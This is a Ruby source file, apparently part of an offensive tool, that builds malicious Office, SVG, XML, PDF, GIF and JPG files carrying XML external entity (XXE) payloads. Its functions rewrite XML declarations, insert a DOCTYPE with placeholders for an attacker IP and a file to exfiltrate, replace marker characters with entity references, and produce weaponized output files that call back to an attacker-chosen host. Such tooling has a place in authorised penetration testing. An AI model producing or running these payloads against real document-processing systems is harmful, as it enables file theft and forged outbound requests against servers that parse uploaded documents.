# encoding: ASCII-8BIT
require 'zipruby'
require 'fileutils'
require 'json'

# Insert the payload into every XML document in the document
def add_payload_all(fz,payload)
	fz.each do |name|
		add_payload(name, payload)
	end
end

# takes in a docx and returns a list of files
def list_files(docx)
	files = []
	Zip::Archive.open(docx, Zip::CREATE) do |zipfile|
		n = zipfile.num_files # gather entries

		n.times do |i|
			entry_name = zipfile.get_name(i) # get entry name from archive
			files.push(entry_name)
		end
	end
	return files
end

# Inserts payload into all files
def add_payload_of(fz,payloadx,of)

	# get file ext
	ext = @options["file"].split(".").last
	nname = "output_#{Time.now.to_i}_all"
	rand_file = "./output/#{nname}.#{ext}"
	FileUtils::copy_file(@options["file"],rand_file)

	fz.each do |name|

		document = ""
		# Read in the XLSX and grab the document.xml
		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.fopen(name) do |f|
				document = f.read # read entry content
			end
		end

		docx_xml = payload(document,payloadx)

		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.add_or_replace_buffer(name,
									  docx_xml)
		end
	end
	puts "|+| Created #{rand_file}"
end

def insert_payload_docx(ffile,name,payloadx,ip,exfil)
	document = ""

	# Read in the XLSX and grab the #{name}
	Zip::Archive.open(ffile, Zip::CREATE) do |zipfile|
		zipfile.fopen(name) do |f|
			document = f.read # read entry content
		end
	end
	# get file ext
	ext = ffile.split(".").last
	nname = "output_#{Time.now.to_i}_#{name.gsub(".","_").gsub("/","_")}"
	rand_file = "./output/#{nname}.#{ext}"

	docx_xml = payload(document,payloadx,ip,exfil)

	FileUtils::copy_file(ffile,rand_file)
	Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
		zipfile.add_or_replace_buffer(name,
								  docx_xml)
	end

	return rand_file
end

# overridden method for replacing entire xml files
def insert_payload_docx_(ffile,name,payloadx,ip,exfil,bool_replace_xml)
	document = ""

	# Read in the XLSX and grab the #{name}
	Zip::Archive.open(ffile, Zip::CREATE) do |zipfile|
		zipfile.fopen(name) do |f|
			document = f.read # read entry content
		end
	end
	# get file ext
	ext = ffile.split(".").last
	nname = "output_#{Time.now.to_i}_#{name.gsub(".","_").gsub("/","_")}"
	rand_file = "./output/#{nname}.#{ext}"

	docx_xml = payload(document,payloadx,ip,exfil)
	docx_xml = payloadx if bool_replace_xml

	FileUtils::copy_file(ffile,rand_file)
	Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
		zipfile.add_or_replace_buffer(name,
								  docx_xml)
	end

	return rand_file
end


def insert_payload_svg(ffile,payloadx,ip,exfil)
	# get file ext
	nname = "output_#{Time.now.to_i}"
	rand_file = "./output/#{nname}.svg"

	contents = File.open(ffile, "rb").read

	svg_p = payload(contents,payloadx,ip,exfil)

	File.open(rand_file, 'w') { |file| file.write(svg_p) }

	return rand_file
end

def insert_payload_xml(ffile,payloadx,ip,exfil)
	# get file ext
	nname = "output_#{Time.now.to_i}"
	rand_file = "./output/#{nname}.xml"

	contents = File.open(ffile, "rb").read

	xml_p = payload(contents,payloadx,ip,exfil)

	# TODO this should handle if canary is used

	File.open(rand_file, 'w') { |file| file.write(xml_p) }

	return rand_file
end

# TODO there are many combinations of XML doctype this doesnt cover; bug if user supplies odd xml
# this does a simple substitution of the [X]XE into the document DOCTYPE.
#	It also resets the xml from standalone "yes" to "no"
def payload(document,payload,ip,exfiltrate)
	# insert the payload, TODO this should be refactored
	document = document.gsub('<?xml version="1.0" encoding="UTF-8"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>#{payload.gsub('IP',ip).gsub('FILE',exfiltrate)}""")
	document = document.gsub('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>#{payload.gsub('IP',ip).gsub('FILE',exfiltrate)}""")
	return document
end

def pdf_poc(hostname)

	# it's a hack, but gsubing into form pdf
	file = "./samples/form.pdf"

	payload = '<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/EXF">'
	payload = payload.gsub("IP",hostname)

	len = 16724+payload.size
	nm = "./output/o_#{Time.now.to_i}.pdf"

	out = File.open(nm,"wb")
	fil = File.open(file,"rb")

	while(line = fil.gets)
		line = line.chomp
		line = line.gsub("-----",len.to_s)
		line = line.gsub("---",payload)
		out.puts(line)
	end
	return nm
end

def gif_poc(hostname)

	file = "./samples/xmp.gif"

	nm = "./output/o_#{Time.now.to_i}.gif"

	payload = '<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/EXF">'
	payload = payload.gsub("IP",hostname)

	out = File.open(nm,"wb")
	fil = File.open(file,"rb")

	while(line = fil.gets)
		line = line.gsub("-----",payload)
		out.puts(line)
	end

	return nm
end

def jpg_poc(hostname)

	file = "./samples/tunnel-depth.jpg"

	nm = "./output/o_#{Time.now.to_i}.jpg"

	payload = '<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/EXF">'
	payload = payload.gsub("IP",hostname)

	out = File.open(nm,"wb")
	fil = File.open(file,"rb")

	while(line = fil.gets)
		line = line.gsub("-----",payload.gsub('\\') {'\\\\'})
		out.puts(line)
	end

	return nm
end

def string_replace(payload,input_file,ip,exfiltrate)
	targets = []

	Zip::Archive.open(input_file, Zip::CREATE) do |zipfile|
		n = zipfile.num_files # gather entries

		n.times do |i|
			nm = zipfile.get_name(i)
			zipfile.fopen(nm) do |f|
				document = f.read # read entry content
				if document =~ /§/
					targets.push(nm)
				end
			end
		end
	end

	if targets.size == 0
		return "|-| Could not find § in document, please verify."
	end

	# get file ext
	ext = input_file.split(".").last
	nname = "output_#{Time.now.to_i}_all"
	rand_file = "./output/#{nname}_rr.#{ext}"
	FileUtils::copy_file(input_file,rand_file)

	targets.each do |target|

		document = ""
		# Read in the XLSX and grab the document.xml
		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.fopen(target) do |f|
				document = f.read # read entry content
			end
		end

		docx_xml = payload(document,payload,ip,exfiltrate)

		# replace string
		docx_xml = docx_xml.gsub("§","&xxe;")

		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.add_or_replace_buffer(target,
									  docx_xml)
		end
	end

	return rand_file
end

def clean_xml(code)
	return code unless code
	# take in xml, clean for display in UI
	code = code.gsub(">","&gt;\n")
	code = code.gsub("<","&lt;")
	code = code.gsub("           ","")
	return code
end

def clean_html(code)
	return code unless code
	code = code.gsub(">","&gt;\n")
	code = code.gsub("<","&lt;")
	code = code.gsub("           ","")
	return code
end

def display_file(rand_file)
	ext = rand_file.split('.').last

	@files = []
	if ext =~ /xml/ or ext =~ /svg/
		file = {}
		file["name"] = "XML/SVG FILE"
		file["id"] = 0
		file["contents"] = clean_xml(File.open(rand_file, "rb").read)
		@files = [file]
	elsif ext =~ /pdf/ or ext =~ /jpg/ or ext =~ /gif/
		file = {}
		file["name"] = "PDF/JPG/GIF"
		file["id"] = 0
		file["contents"] = "NOT AN XML FILE"
		@files = [file]
	else
		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			n = zipfile.num_files # gather entries

			n.times do |i|
				file = {}
				nm = zipfile.get_name(i)
				file["name"] = nm
				file["id"] = i
				if nm =~ /xml/ or nm =~ /_rels/ or nm =~ /Cont/
					zipfile.fopen(nm) do |f|
						document = f.read
						if document
							file["contents"] = clean_xml(document) # read entry content
						else
							file["contents"] = "EMPTY FILE"
						end
					end
				else
					file["contents"] = "NOT AN XML FILE"
				end
				@files.push(file)
			end
		end
	end
	return @files
end